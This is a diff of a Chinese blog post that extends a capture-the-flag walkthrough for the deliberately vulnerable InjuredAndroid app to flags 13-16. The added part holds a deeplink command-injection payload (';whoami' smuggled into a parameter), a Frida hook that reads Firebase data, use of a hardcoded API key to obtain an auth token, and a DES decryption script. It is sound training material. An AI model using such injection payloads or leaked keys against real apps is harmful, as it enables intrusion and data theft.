@@ -18,14 +18,14 @@
   
     <meta name="description" content="来活到最后只有你 越想得边个的拥抱 -《人神斗》">
 <meta property="og:type" content="article">
-<meta property="og:title" content="InjuredAndroid - CTF 7-12">
+<meta property="og:title" content="InjuredAndroid - CTF 7-16">
 <meta property="og:url" content="http://example.com/2026/02/27/InjuredAndroid%20-%20CTF%207-12/index.html">
 <meta property="og:site_name" content="J_0k3r">
 <meta property="og:description" content="来活到最后只有你 越想得边个的拥抱 -《人神斗》">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/img/zmy.jpg">
 <meta property="article:published_time" content="2026-02-27T05:14:52.000Z">
-<meta property="article:modified_time" content="2026-02-27T09:47:45.961Z">
+<meta property="article:modified_time" content="2026-02-28T16:09:24.795Z">
 <meta property="article:author" content="J_0k3r">
 <meta property="article:tag" content="笔记">
 <meta name="twitter:card" content="summary_large_image">
@@ -35,7 +35,7 @@
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>InjuredAndroid - CTF 7-12 - J_0k3r</title>
+  <title>InjuredAndroid - CTF 7-16 - J_0k3r</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -251,7 +251,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="InjuredAndroid - CTF 7-12"></span>
+            <span id="subtitle" data-typed-text="InjuredAndroid - CTF 7-16"></span>
           
         </div>
 
@@ -279,7 +279,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.8k 字
+          2.4k 字
         
       </span>
     
@@ -290,7 +290,7 @@
         
         
         
-          16 分钟
+          21 分钟
         
       </span>
     
@@ -339,12 +339,12 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">InjuredAndroid - CTF 7-12</h1>
+            <h1 id="seo-header">InjuredAndroid - CTF 7-16</h1>
             
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2026年2月27日 下午
+                    本文最后更新于 2026年3月1日 凌晨
                   
                 
               </p>
@@ -461,6 +461,63 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;<br>    xmlns:tools=&quot;http://schemas.android.com/tools&quot;&gt;<br><br><br><br>    &lt;application<br>        android:allowBackup=&quot;true&quot;<br>        android:dataExtractionRules=&quot;@xml/data_extraction_rules&quot;<br>        android:fullBackupContent=&quot;@xml/backup_rules&quot;<br>        android:icon=&quot;@mipmap/ic_launcher&quot;<br>        android:label=&quot;@string/app_name&quot;<br>        android:roundIcon=&quot;@mipmap/ic_launcher_round&quot;<br>        android:supportsRtl=&quot;true&quot;<br>        android:theme=&quot;@style/Theme.Poc&quot;<br>        tools:targetApi=&quot;31&quot;<br>        &gt;<br>    &lt;activity<br>        android:name=&quot;.MainActivity&quot;<br>        android:exported=&quot;true&quot;&gt;<br>        &lt;intent-filter&gt;<br>            &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;<br>            &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;<br>        &lt;/intent-filter&gt;<br>    &lt;/activity&gt;<br><br>&lt;/application&gt;<br><br>&lt;/manifest&gt;<br></code></pre></td></tr></table></figure>
 
 <p><img src="/mdimg/InjuredAndroid-CTF0-6/1772184919580-21b12366-2715-491e-a552-f2a2bbcf0827.gif" srcset="/img/loading.gif" lazyload></p>
+<h3 id="FLAG-THIRTEEN-RCE"><a href="#FLAG-THIRTEEN-RCE" class="headerlink" title="FLAG THIRTEEN - RCE"></a>FLAG THIRTEEN - RCE</h3><p><code>b3nac.injuredandroid.RCEActivity</code></p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772263568312-23472166-fcc7-444a-ad7c-3df888e9f137.png" srcset="/img/loading.gif" lazyload></p>
+<p>接收intent，将参数<code>binary</code>和<code>param</code>拼接传入<code>runtime.exec()</code>,实现命令执行。前面<code>filesdir</code>和<code>files</code>拼接的是命令的二进制文件路径。执行命令本质上就是执行bin目录的二进制可执行文件。</p>
+<p>这里没有对输入exec的值进行任何处理。可以通过拼接执行任意命令。</p>
+<p>通过<code>;</code>、<code>&amp;</code>、<code>|</code>等拼接命令</p>
+<p>查看AndroidManifest.xml，这个activity要通过deeplink调用</p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772264006489-684e9c59-e57c-4a33-bd75-1408733fdbdc.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>adb shell am start -a android.intent.action.VIEW  -d &quot;flag13://rce?binary=ls&amp;param=;whoami&quot;</code></p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772262733053-6fda76d9-fbfd-4117-8d78-ad1c81f93e27.png" srcset="/img/loading.gif" lazyload></p>
+<p>要拿到flag要用到<code>combined</code>参数</p>
+<p>因为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">if (queryParameter3 != null) &#123;<br>                        this.x.b(new b(queryParameter3));<br>                    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>实例化了b方法，也就是读取flag并校验的方法。</p>
+<p>可以hook<code>com.google.firebase.database.a</code>读取数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain">Java.perform(function () &#123;<br>    // 锁定 Firebase 的 DataSnapshot 类<br>    var DataSnapshot = Java.use(&quot;com.google.firebase.database.a&quot;); // 根据混淆可能需要调整路径<br><br>    DataSnapshot.c.implementation = function () &#123; // 对应代码中的 aVar.c()<br>        var result = this.c();<br>        console.log(&quot;[*] Firebase Data Retreived: &quot; + result);<br>        return result;<br>    &#125;;<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p>deeplink带<code>combined</code>参数触发b方法</p>
+<p><code>adb shell am start -a android.intent.action.VIEW  -d &quot;flag13://rce?combined=xxx&quot;</code></p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772264912088-f9b60fa6-b8f5-40cb-848b-d225af489718.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>Treasure_Planet</code></p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772265241237-86355138-e213-4fbb-a6dd-d1f1cd059391a.png" srcset="/img/loading.gif" lazyload></p>
+<p>这时发现其实<code>res/values/strings.xml</code>硬编码了认证的<code>google_api_key</code></p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772265306531-ca19feb7-1d16-4131-9dba-68e70c5c9031.png" srcset="/img/loading.gif" lazyload></p>
+<p>拿apikey post请求匿名登录拿到idtoken</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyCUImEIOSvqAswLqFak75xhskkB6illd7A<br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772265406318-66e2dbfb-421c-4723-a7a7-f16a95287d47.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>[https://injuredandroid.firebaseio.com/rce.json?auth=](https://injuredandroid.firebaseio.com/rce.json?auth=)xxx</code></p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772265229531-7c21db84-5ad3-4188-bfdb-c4cce7808c9f.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="FLAG-FOURTEEN-FLUTTER-XSS"><a href="#FLAG-FOURTEEN-FLUTTER-XSS" class="headerlink" title="FLAG FOURTEEN - FLUTTER XSS"></a>FLAG FOURTEEN - FLUTTER XSS</h3><h3 id="FLAG-FIFTEEN-FLUTTER-ASSEMBLY"><a href="#FLAG-FIFTEEN-FLUTTER-ASSEMBLY" class="headerlink" title="FLAG FIFTEEN - FLUTTER ASSEMBLY"></a>FLAG FIFTEEN - FLUTTER ASSEMBLY</h3><p><code>b3nac.injuredandroid.AssemblyActivity</code></p>
+<p>submitflag调用b方法</p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772270016607-ee24c126-8a63-4bea-b8a9-095c2c3e16b8.png" srcset="/img/loading.gif" lazyload></p>
+<p>输入框，老一套</p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772269844528-84035a80-35f2-432a-bbb8-71f098f25f79.png" srcset="/img/loading.gif" lazyload></p>
+<p>或者直接<code>[https://injuredandroid.firebaseio.com/assembly.json?auth=](https://injuredandroid.firebaseio.com/assembly.json?auth=)xxx</code></p>
+<p>看到有加载本地库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">static &#123;<br>    System.loadLibrary(&quot;native-lib&quot;);<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772270333426-373f0a1b-822d-4cb8-9d60-5eedb4b6f3d8.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772270439820-91a66b46-6edf-4c9b-9262-a4a7db53cf3c.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="FLAG-SIXTEEN-CSP-BYPASS"><a href="#FLAG-SIXTEEN-CSP-BYPASS" class="headerlink" title="FLAG SIXTEEN - CSP BYPASS"></a>FLAG SIXTEEN - CSP BYPASS</h3><p>AndroidManifest.xml</p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772270720313-3ad262d7-db37-4094-9cf7-78e53f30db1d.png" srcset="/img/loading.gif" lazyload></p>
+<p>deeplink触发</p>
+<p><code>b3nac.injuredandroid.CSPBypassActivity</code></p>
+<p>m方法</p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772271901783-87037da9-221b-47e8-a2d0-04a610638f68.png" srcset="/img/loading.gif" lazyload></p>
+<p>a、b加密是一样的都是des只是密钥不同</p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772271938637-2c7f4897-92a6-4166-811a-c3107ee25da4.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs plain">from Crypto.Cipher import DES<br>import base64<br><br>def decrypt_des(ciphertext_base64, key_bytes):<br>    # DES 密钥必须是 8 字节，Java 的 DESKeySpec 会截断或处理<br>    key = key_bytes[:8]<br>    cipher = DES.new(key, DES.MODE_ECB)<br>    <br>    # Base64 解码<br>    encrypted_data = base64.b64decode(ciphertext_base64)<br>    <br>    # 执行解密<br>    decrypted_data = cipher.decrypt(encrypted_data)<br>    <br>    # 移除 PKCS5/7 填充 (DES 块大小为 8)<br>    padding_len = decrypted_data[-1]<br>    return decrypted_data[:-padding_len].decode(&#x27;utf-8&#x27;)<br><br># 1. 准备密钥 (来自 h.java)<br>key_b_raw = base64.b64decode(&quot;Q2FwdHVyM1RoMXM=&quot;)          # 用于 k.a<br>key_a_raw = base64.b64decode(&quot;e0NhcHR1cjNUaDFzVG9vfQ==&quot;) # 用于 k.b<br><br># 2. 待解密的密文<br>target_cipher = &quot;kOC6ZrdMXEnfIKWihcBNLTWIhDiINUfSQyYrFsTpEBGZy1KmfPMTwtba8CXa/WVAVoJ1ACvJMd8f/MF97/7UaeNCQvC9OD4lZ/vQN6LmpBU=&quot;<br><br>try:<br>    # 第一层解密：对应 k.b(str)<br>    first_step = decrypt_des(target_cipher, key_a_raw)<br>    print(f&quot;第一层解密结果: &#123;first_step&#125;&quot;)<br>    <br>    # 第二层解密：对应 k.a(first_step)<br>    # 注意：第一层出来的结果也是 Base64 格式<br>    final_flag = decrypt_des(first_step, key_b_raw)<br>    print(f&quot;最终 Flag/URL: &#123;final_flag&#125;&quot;)<br><br>except Exception as e:<br>    print(f&quot;解密失败，请检查填充或密钥: &#123;e&#125;&quot;)<br><br><br>####第一层解密结果: +D8wTKFawdpzDeaQweqRF9JrNCJIBc9xR+mQXdIwIj+jYtTA3uVc+g8K68YFw7QMFCc8sbDwXL8=<br>###最终 Flag/URL: https://b3nac.com/contentsecuritypolicyflag.html<br></code></pre></td></tr></table></figure>
+
+<p>解密出来的是<code>https</code>，存在csp</p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772274253154-a4846329-2a41-48cc-956a-1a3d286899b7.png" srcset="/img/loading.gif" lazyload></p>
+<p>但是l方法会拼接host和path，http强制拼接为https</p>
+<p>环境应该有问题，复现不了</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/B3nac/InjuredAndroid/blob/master/InjuredAndroid-FlagWalkthroughs.md">https://github.com/B3nac/InjuredAndroid/blob/master/InjuredAndroid-FlagWalkthroughs.md</a></p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772272077770-35532632-fdb5-42c0-a50f-082371a9c69e.png" srcset="/img/loading.gif" lazyload></p>
 
                 
               </div>
@@ -513,7 +570,7 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>InjuredAndroid - CTF 7-12</div>
+      <div>InjuredAndroid - CTF 7-16</div>
       <div>http://example.com/2026/02/27/InjuredAndroid - CTF 7-12/</div>
     </div>
     <div class="license-meta">
